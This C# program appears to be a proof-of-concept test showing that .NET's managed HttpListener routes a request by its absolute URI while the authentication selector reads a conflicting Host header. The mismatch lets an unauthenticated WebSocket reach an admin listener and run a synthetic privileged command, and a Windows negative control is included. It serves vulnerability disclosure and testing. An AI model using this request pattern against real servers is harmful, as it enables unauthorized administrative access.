using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    private const string PrivilegedCommand = "EXECUTE_SYNTHETIC_ADMIN_CHANGE";
    private const string ReplySentinel = "ULTIMATE_ADMIN_COMMAND_EXECUTED_42f1";
    private static readonly string SideEffectPath =
        Path.Combine(Path.GetTempPath(), "httplistener-ultimate-admin-sideeffect-42f1.txt");

    static int FreePort()
    {
        using var l = new TcpListener(IPAddress.Loopback, 0);
        l.Start();
        int port = ((IPEndPoint)l.LocalEndpoint).Port;
        l.Stop();
        return port;
    }

    static void Require(bool condition, string message)
    {
        if (!condition)
            throw new Exception("ASSERTION_FAILED: " + message);
    }

    static byte[] BuildMaskedTextFrame(string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        if (payload.Length > 125)
            throw new InvalidOperationException("test payload too large");

        byte[] mask = { 0x21, 0x43, 0x65, 0x87 };
        byte[] frame = new byte[2 + 4 + payload.Length];

        frame[0] = 0x81;
        frame[1] = (byte)(0x80 | payload.Length);
        Array.Copy(mask, 0, frame, 2, 4);

        for (int i = 0; i < payload.Length; i++)
            frame[6 + i] = (byte)(payload[i] ^ mask[i % 4]);

        return frame;
    }

    static async Task<byte[]> ReadHeaders(NetworkStream ns)
    {
        using var ms = new MemoryStream();
        byte[] one = new byte[1];
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
        int state = 0;

        while (true)
        {
            int n = await ns.ReadAsync(one, cts.Token);
            if (n == 0)
                break;

            ms.WriteByte(one[0]);

            state = (state, one[0]) switch
            {
                (0, 13) => 1,
                (1, 10) => 2,
                (2, 13) => 3,
                (3, 10) => 4,
                (_, 13) => 1,
                _ => 0
            };

            if (state == 4)
                break;
        }

        return ms.ToArray();
    }

    static async Task<byte[]> ReadRest(NetworkStream ns)
    {
        using var ms = new MemoryStream();
        byte[] buffer = new byte[4096];
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));

        try
        {
            while (true)
            {
                int n = await ns.ReadAsync(buffer, cts.Token);
                if (n == 0)
                    break;

                await ms.WriteAsync(buffer.AsMemory(0, n), cts.Token);

                if (!ns.DataAvailable)
                    await Task.Delay(100, cts.Token);

                if (ms.Length > 0 && !ns.DataAvailable)
                    break;
            }
        }
        catch (OperationCanceledException)
        {
        }

        return ms.ToArray();
    }

    record Observation(
        string Name,
        string FirstLine,
        bool BasicChallenge,
        bool PublicContext,
        bool AdminContext,
        AuthenticationSchemes SelectedScheme,
        string SelectorUserHost,
        string SelectorUrlHost,
        bool WsUpgrade,
        bool CommandExecuted,
        bool SideEffectCreated);

    static async Task<Observation> RunCase(string name, bool conflict)
    {
        int port = FreePort();

        try { File.Delete(SideEffectPath); } catch { }

        using var publicListener = new HttpListener();
        using var adminListener = new HttpListener();

        publicListener.Prefixes.Add($"http://public.test:{port}/");
        adminListener.Prefixes.Add($"http://admin.test:{port}/admin/ws/");

        publicListener.AuthenticationSchemes = AuthenticationSchemes.Anonymous;

        AuthenticationSchemes selected = AuthenticationSchemes.None;
        string selectorUserHost = "<not-called>";
        string selectorUrlHost = "<not-called>";

        adminListener.AuthenticationSchemes = AuthenticationSchemes.None;
        adminListener.Realm = "ultimate-admin";
        adminListener.AuthenticationSchemeSelectorDelegate = request =>
        {
            selectorUserHost = request.UserHostName ?? "<null>";
            selectorUrlHost = request.Url?.Host ?? "<null>";

            string hostOnly = selectorUserHost.Split(':')[0];

            selected = string.Equals(hostOnly, "public.test", StringComparison.OrdinalIgnoreCase)
                ? AuthenticationSchemes.Anonymous
                : AuthenticationSchemes.Basic;

            Console.WriteLine(
                $"SELECTOR case={name} listener=ADMIN UserHostName={selectorUserHost} Url.Host={selectorUrlHost} Selected={selected}");

            return selected;
        };

        publicListener.Start();
        adminListener.Start();

        Task<HttpListenerContext> publicTask = publicListener.GetContextAsync();
        Task<HttpListenerContext> adminTask = adminListener.GetContextAsync();

        using var client = new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback, port);
        using NetworkStream ns = client.GetStream();

        string target = conflict
            ? $"http://admin.test:{port}/admin/ws/control"
            : "/admin/ws/control";

        string host = conflict
            ? $"public.test:{port}"
            : $"admin.test:{port}";

        string raw =
            $"GET {target} HTTP/1.1\r\n" +
            $"Host: {host}\r\n" +
            "Upgrade: websocket\r\n" +
            "Connection: Upgrade\r\n" +
            "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" +
            "Sec-WebSocket-Version: 13\r\n" +
            "\r\n";

        Console.WriteLine($"RAW_REQUEST case={name} {raw.Replace("\r","<CR>").Replace("\n","<LF>")}");

        await ns.WriteAsync(Encoding.ASCII.GetBytes(raw));
        await ns.FlushAsync();

        bool publicContext = false;
        bool adminContext = false;

        Task serverTask = Task.Run(async () =>
        {
            Task firstContext = await Task.WhenAny(publicTask, adminTask, Task.Delay(5000));

            if (firstContext == publicTask && publicTask.IsCompletedSuccessfully)
            {
                publicContext = true;
                HttpListenerContext ctx = await publicTask;
                Console.WriteLine($"PUBLIC_CONTEXT case={name} Url={ctx.Request.Url}");
                ctx.Response.StatusCode = 200;
                ctx.Response.Close();
                return;
            }

            if (firstContext == adminTask && adminTask.IsCompletedSuccessfully)
            {
                adminContext = true;
                HttpListenerContext ctx = await adminTask;

                Console.WriteLine(
                    $"ADMIN_CONTEXT case={name} UserHostName={ctx.Request.UserHostName} Url={ctx.Request.Url} User={(ctx.User is null ? "ANONYMOUS" : "AUTHENTICATED")} IsWebSocket={ctx.Request.IsWebSocketRequest}");

                if (!ctx.Request.IsWebSocketRequest)
                {
                    ctx.Response.StatusCode = 400;
                    ctx.Response.Close();
                    return;
                }

                HttpListenerWebSocketContext wsContext =
                    await ctx.AcceptWebSocketAsync(subProtocol: null);

                byte[] receive = new byte[1024];
                WebSocketReceiveResult rr = await wsContext.WebSocket.ReceiveAsync(
                    new ArraySegment<byte>(receive),
                    CancellationToken.None);

                string command = Encoding.UTF8.GetString(receive, 0, rr.Count);
                Console.WriteLine($"ADMIN_WS_COMMAND case={name} command={command}");

                string reply;

                if (command == PrivilegedCommand)
                {
                    File.WriteAllText(SideEffectPath, "ULTIMATE_PROTECTED_ADMIN_OPERATION_EXECUTED");
                    reply = ReplySentinel;
                }
                else
                {
                    reply = "COMMAND_REJECTED";
                }

                byte[] replyBytes = Encoding.UTF8.GetBytes(reply);
                await wsContext.WebSocket.SendAsync(
                    new ArraySegment<byte>(replyBytes),
                    WebSocketMessageType.Text,
                    endOfMessage: true,
                    CancellationToken.None);

                await wsContext.WebSocket.CloseOutputAsync(
                    WebSocketCloseStatus.NormalClosure,
                    "done",
                    CancellationToken.None);
            }
        });

        byte[] headers = await ReadHeaders(ns);
        string headerText = Encoding.ASCII.GetString(headers);
        string firstLine = headerText.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None)[0];
        bool basic = headerText.Contains("WWW-Authenticate: Basic", StringComparison.OrdinalIgnoreCase);
        bool wsUpgrade = firstLine.Contains("101", StringComparison.Ordinal);

        if (wsUpgrade)
        {
            byte[] frame = BuildMaskedTextFrame(PrivilegedCommand);
            await ns.WriteAsync(frame);
            await ns.FlushAsync();
        }

        byte[] rest = await ReadRest(ns);
        string restAscii = Encoding.ASCII.GetString(rest);

        bool commandExecuted = restAscii.Contains(ReplySentinel, StringComparison.Ordinal);
        bool sideEffectCreated = File.Exists(SideEffectPath);

        await Task.WhenAny(serverTask, Task.Delay(2000));

        Console.WriteLine(
            $"RESULT case={name} first={firstLine} basicChallenge={basic} publicContext={publicContext} adminContext={adminContext} selected={selected} selectorUserHost={selectorUserHost} selectorUrlHost={selectorUrlHost} wsUpgrade={wsUpgrade} commandExecuted={commandExecuted} sideEffectCreated={sideEffectCreated}");

        publicListener.Close();
        adminListener.Close();

        return new Observation(
            name,
            firstLine,
            basic,
            publicContext,
            adminContext,
            selected,
            selectorUserHost,
            selectorUrlHost,
            wsUpgrade,
            commandExecuted,
            sideEffectCreated);
    }

    static async Task Main()
    {
        Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
        Console.WriteLine($"OS={RuntimeInformation.OSDescription}");

        Observation control = await RunCase("ADMIN_CONTROL", conflict: false);

        Require(control.FirstLine.Contains("401"),
            "ordinary admin WebSocket must return 401");
        Require(control.BasicChallenge,
            "ordinary admin WebSocket must contain Basic challenge");
        Require(control.SelectedScheme == AuthenticationSchemes.Basic,
            "ordinary admin selector must choose Basic");
        Require(!control.PublicContext && !control.AdminContext,
            "ordinary unauthenticated admin request must not be delivered as context");
        Require(!control.WsUpgrade && !control.CommandExecuted && !control.SideEffectCreated,
            "ordinary unauthenticated admin request must not establish channel or execute side effect");

        Observation attack = await RunCase("ABSOLUTE_ADMIN_HOST_PUBLIC", conflict: true);

        if (OperatingSystem.IsWindows())
        {
            Require(attack.FirstLine.Contains("401"),
                "Windows/http.sys must challenge conflict");
            Require(attack.BasicChallenge,
                "Windows/http.sys must contain Basic challenge");
            Require(attack.SelectedScheme == AuthenticationSchemes.Basic,
                "Windows/http.sys selector must see admin authority");
            Require(!attack.AdminContext && !attack.WsUpgrade &&
                    !attack.CommandExecuted && !attack.SideEffectCreated,
                "Windows/http.sys must not deliver protected listener or execute command");

            Console.WriteLine("ULTIMATE_WINDOWS_NEGATIVE_CONTROL=PASS");
        }
        else
        {
            Require(attack.FirstLine.Contains("101"),
                "managed conflict must establish WebSocket");
            Require(!attack.BasicChallenge,
                "managed conflict must omit Basic challenge");
            Require(!attack.PublicContext && attack.AdminContext,
                "HttpListener framework must route to exact ADMIN host+path listener");
            Require(attack.SelectedScheme == AuthenticationSchemes.Anonymous,
                "admin listener selector must downgrade to Anonymous");
            Require(attack.SelectorUserHost.StartsWith("public.test", StringComparison.OrdinalIgnoreCase),
                "selector must see stale public Host");
            Require(string.Equals(attack.SelectorUrlHost, "admin.test", StringComparison.OrdinalIgnoreCase),
                "same selector must see admin Url.Host");
            Require(attack.WsUpgrade && attack.CommandExecuted,
                "protected admin WebSocket command must execute");
            Require(attack.SideEffectCreated,
                "protected admin command must produce concrete filesystem side effect");
            Require(File.ReadAllText(SideEffectPath) ==
                    "ULTIMATE_PROTECTED_ADMIN_OPERATION_EXECUTED",
                "side effect marker must confirm protected operation");

            Console.WriteLine($"ULTIMATE_SIDE_EFFECT_PATH={SideEffectPath}");
            Console.WriteLine("ULTIMATE_FRAMEWORK_ROUTING_AUTH_WEBSOCKET_COMMAND_BYPASS=CONFIRMED");
        }
    }
}
